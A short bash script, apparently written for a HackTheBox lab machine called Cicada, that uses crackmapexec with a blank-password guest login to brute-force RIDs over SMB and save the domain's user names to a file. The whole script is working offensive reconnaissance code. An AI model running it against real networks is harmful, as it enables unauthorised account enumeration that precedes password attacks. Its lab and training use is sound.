#!/bin/bash

# Define the IP address, domain, username, and password
IP="10.10.11.35"
DOMAIN="cicada.htb"
USERNAME="guest"
PASSWORD=""

# Run crackmapexec with --rid-brute and filter only the usernames
sudo crackmapexec smb $IP -d $DOMAIN -u "$USERNAME" -p "$PASSWORD" --rid-brute | \
grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}' > usernames.txt

# Output the results
echo "Usernames have been saved to usernames.txt"